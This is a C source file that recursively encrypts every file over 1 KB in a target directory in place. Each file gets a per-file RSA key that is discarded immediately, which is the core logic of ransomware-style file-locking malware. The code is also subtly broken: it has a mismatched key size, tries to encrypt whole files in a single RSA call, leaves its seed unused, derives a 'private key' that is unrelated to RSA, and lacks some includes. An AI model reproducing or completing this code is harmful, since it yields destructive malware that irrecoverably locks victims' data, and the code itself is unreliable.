#include <string.h>

#define KEY_LENGTH 4096
#define SHA_256_DIGEST_SIZE 32
#define FILE_SIZE_THRESHOLD 1024 // in bytes

void generateRSAKeyPair(unsigned char* seed, RSA* rsaKey) {
    BIGNUM* e = BN_new();
    BN_set_word(e, 0x10001);
    RSA_generate_key_ex(rsaKey, KEY_LENGTH/8, e, NULL, NULL);
    BN_free(e);
}

unsigned char* derivePrivatekeyFromSeed(unsigned char* seed, const EVP_MD* md) {
    unsigned char* private_key = (unsigned char*)malloc(SHA_256_DIGEST_SIZE);
    SHA256_CTX sha256_ctx;
    SHA256_Init(&sha256_ctx);
    SHA256_Update(&sha256_ctx, seed, strlen((char*)seed));
    SHA256_Final(private_key, &sha256_ctx);
    return private_key;
}

void encryptFile(const char* file_path, RSA* rsaKey) {
    FILE* file = fopen(file_path, "rb+");
    if (file == NULL) {
        printf("Error opening file: %s\n", file_path);
        return;
    }
    fseek(file, 0, SEEK_END);
    int file_size = ftell(file);
    rewind(file);

    if (file_size <= FILE_SIZE_THRESHOLD) {
        fclose(file);
        return;
    }

    unsigned char* buffer = (unsigned char*)malloc(file_size);
    fread(buffer, 1, file_size, file);

    unsigned char* encrypted_buffer = (unsigned char*)malloc(file_size);
    RSA_public_encrypt(file_size, buffer, encrypted_buffer, rsaKey, RSA_PKCS1_OAEP_PADDING);

    fclose(file);
    file = fopen(file_path, "wb+");
    fwrite(encrypted_buffer, 1, file_size, file);
    free(buffer);
    free(encrypted_buffer);
}

void decryptFile(const char* file_path, RSA* rsaKey) {
    FILE* file = fopen(file_path, "rb");
    if (file == NULL) {
        printf("Error opening file: %s\n", file_path);
        return;
    }

    fseek(file, 0, SEEK_END);
    int file_size = ftell(file);
    rewind(file);

    unsigned char* buffer = (unsigned char*)malloc(file_size);
    fread(buffer, 1, file_size, file);

    unsigned char* decrypted_buffer = (unsigned char*)malloc(file_size);
    RSA_private_decrypt(file_size, buffer, decrypted_buffer, rsaKey, RSA_PKCS1_OAEP_PADDING);

    fclose(file);
    file = fopen(file_path, "wb+");
    fwrite(decrypted_buffer, 1, file_size, file);
    free(buffer);
    free(decrypted_buffer);
}

void processDirectory(const char* directory_path) {
    DIR* dir;
    struct dirent* ent;

    if (!(dir = opendir(directory_path))) {
        printf("Error opening directory: %s\n", directory_path);
        return;
    }

    while ((ent = readdir(dir)) != NULL) {
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
            continue;

        char file_path[PATH_MAX];
        sprintf(file_path, "%s/%s", directory_path, ent->d_name);

        struct stat statbuf;
        if (stat(file_path, &statbuf) != 0) {
            printf("Error getting file stats: %s\n", file_path);
            continue;
        }

        int file_size = statbuf.st_size;

        if (file_size > FILE_SIZE_THRESHOLD) {
            RSA* rsaKey = RSA_new();
            unsigned char* seed = (unsigned char*)malloc(KEY_LENGTH/8);
            // Initialize the seed with some random data
            // ...
            generateRSAKeyPair(seed, rsaKey);

            unsigned char* private_key = derivePrivatekeyFromSeed(seed, EVP_sha256());

            encryptFile(file_path, rsaKey);

            RSA_free(rsaKey);
            free(private_key);
        }
    }

    closedir(dir);
}

int main() {
    // Set default encryption directory if necessary
    const char* encryption_directory = "/path/to/encryption/directory";

    processDirectory(encryption_directory);

    return 0;
}
